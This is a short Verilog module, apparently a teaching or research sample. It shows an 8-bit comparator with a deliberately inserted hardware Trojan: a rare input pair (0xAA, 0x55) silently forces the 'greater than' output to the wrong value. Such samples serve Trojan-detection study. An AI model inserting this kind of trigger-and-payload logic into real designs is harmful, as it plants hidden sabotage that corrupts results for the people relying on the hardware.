module cmp8(input [7:0] a, input [7:0] b, output gt);
  wire trigger;
  wire gt_real;
  wire gt_degraded;

  assign gt_real = (a > b);

  // Rare trigger: fires only when a == 8'hAA and b == 8'h55
  assign trigger = (a == 8'hAA) && (b == 8'h55);

  // Payload: degrade performance by forcing gt to 0 on trigger
  // (8'hAA > 8'h55 should be 1, but Trojan drives 0)
  assign gt_degraded = gt_real & ~trigger;

  assign gt = gt_degraded;
endmodule